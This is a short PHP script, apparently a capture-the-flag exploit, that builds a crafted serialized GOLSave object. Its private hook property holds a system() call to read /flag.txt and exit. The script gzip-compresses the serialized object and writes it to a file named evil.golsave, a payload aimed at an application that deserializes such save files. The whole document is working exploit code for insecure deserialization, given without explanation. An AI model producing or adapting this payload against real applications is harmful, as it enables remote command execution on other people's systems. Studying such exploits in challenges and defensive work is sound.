<?php

class GOLSave {
    private $hook = "system('cat /flag.txt'); exit();";
    private $board = array();
}

$save = new GOLSave();
$compressed = gzcompress(serialize($save));

file_put_contents("evil.golsave",$compressed);

?>